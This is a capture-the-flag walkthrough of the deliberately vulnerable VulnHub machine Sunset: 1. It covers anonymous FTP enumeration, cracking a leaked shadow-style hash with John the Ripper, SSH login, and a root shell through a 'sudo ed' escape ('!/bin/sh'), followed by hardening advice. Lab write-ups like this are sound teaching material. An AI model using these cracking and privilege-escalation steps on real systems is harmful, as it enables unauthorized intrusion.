# Sunset: 1 (VulnHub)

## Overview

**Sunset: 1** is an Easy-level VulnHub machine created by **whitecr0wz**. The challenge focuses on FTP enumeration, password hash extraction, offline password cracking, SSH authentication, and Linux privilege escalation through an insecure sudo configuration.

The machine demonstrates how anonymous FTP access combined with exposed credential backups and unsafe sudo permissions can lead to complete system compromise.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Sunset: 1 |
| Author | whitecr0wz |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Debian Linux |
| Attacker OS | Kali Linux |
| Objective | Obtain User and Root Flags |

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Anonymous FTP Access
- Credential Harvesting
- Password Hash Analysis
- Offline Password Cracking
- John the Ripper
- SSH Authentication
- Linux Enumeration
- Sudo Enumeration
- GTFOBins Exploitation
- Linux Privilege Escalation
- Post-Exploitation

## Tools Used

- ARP-Scan
- Nmap
- FTP Client
- John the Ripper
- SSH
- GTFOBins
- Linux Enumeration Commands
- Kali Linux

## Attack Methodology

1. Discover the target machine on the network.
2. Enumerate open ports and services.
3. Identify anonymous FTP access.
4. Download exposed backup files.
5. Extract password hashes from the backup.
6. Crack the target user's password hash offline.
7. Authenticate via SSH using recovered credentials.
8. Obtain user-level access.
9. Enumerate sudo permissions.
10. Identify unsafe sudo configuration.
11. Abuse GTFOBins technique using `ed`.
12. Escalate privileges to root.
13. Capture both user and root flags.

## Open Services Identified

| Port | Service |
|--------|---------|
| 21 | FTP (pyftpdlib 1.5.5) |
| 22 | SSH (OpenSSH 7.9p1) |

### Key Findings

- Anonymous FTP login enabled.
- Backup file exposed through FTP.
- Password hashes stored in accessible backup.
- SSH service available for remote access.
- Unsafe sudo configuration allowing privilege escalation. 

## Vulnerabilities Identified

### 1. Anonymous FTP Access

The FTP service allowed anonymous authentication:

```text
Anonymous FTP login allowed
```

This exposed sensitive files that should not have been publicly accessible. 

### 2. Credential Backup Exposure

A backup file was accessible through FTP and contained multiple SHA-512 password hashes resembling `/etc/shadow` entries.

```text
backup
```

The file included hashes for several users, including the target account. 

### 3. Weak Password Security

The recovered hash for user `sunset` was successfully cracked using John the Ripper, demonstrating weak password selection. 

### 4. Dangerous Sudo Permissions

The user account was allowed to execute:

```text
(root) NOPASSWD: /usr/bin/ed
```

which can be abused through GTFOBins techniques to obtain a root shell. 

## Service Enumeration

### FTP Enumeration

Connect anonymously:

```bash
ftp <target-ip>
```

Directory listing revealed:

```text
backup
```

The file contained password hashes for multiple users. 

### SSH Enumeration

Nmap identified:

```text
OpenSSH 7.9p1 Debian
```

SSH became the primary access vector after recovering valid credentials. 

## Initial Access

### Password Recovery

Extract the target user's SHA-512 hash and crack it using John the Ripper:

```bash
john pass.txt
```

The password was recovered successfully and used for SSH authentication.

### SSH Login

```bash
ssh sunset@<target-ip>
```

After authentication, user-level access was obtained and the user flag was retrieved.

## Privilege Escalation

Running:

```bash
sudo -l
```

revealed:

```text
(root) NOPASSWD: /usr/bin/ed
```

According to GTFOBins, `ed` can spawn a shell:

```bash
sudo ed
!/bin/sh
```

Executing the above command resulted in immediate root access. 

## Root Access

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

Navigate to the root directory and retrieve the flag:

```bash
cd /root
cat flag.txt
```

Root compromise successfully achieved.

## Attack Chain Summary

- Network Discovery using ARP-Scan
- Service Enumeration using Nmap
- Anonymous FTP Access
- Backup File Discovery
- Password Hash Extraction
- John the Ripper Password Cracking
- SSH Login as sunset
- Sudo Enumeration
- GTFOBins ed Exploitation
- Root Shell Access
- Flag Retrieval

## Security Recommendations

- Disable anonymous FTP access.
- Avoid storing credential backups in publicly accessible locations.
- Use strong and unique passwords.
- Protect password hashes as sensitive information.
- Restrict SSH access to authorized users only.
- Avoid granting sudo access to dangerous binaries.
- Apply the Principle of Least Privilege.
- Monitor FTP, SSH, and sudo activity.
- Conduct regular security audits and vulnerability assessments.

## Key Learning Outcomes

- Anonymous FTP services can expose sensitive information.
- Credential backups should be treated as highly sensitive assets.
- Offline password cracking remains effective against weak passwords.
- SSH security depends heavily on credential strength.
- GTFOBins is a valuable resource for privilege escalation assessment.
- Misconfigured sudo permissions frequently lead to full system compromise.
- Thorough enumeration is often the key to successful penetration testing.

## Conclusion

Sunset: 1 is an excellent beginner-friendly VulnHub machine for learning FTP enumeration, credential harvesting, password cracking, SSH authentication, and Linux privilege escalation. By leveraging exposed password backups and abusing an unsafe sudo configuration, complete system compromise was achieved. 

---

**Author:** Omkar Babaji Sawant  
**Repository:** VulnHub-Walkthroughs
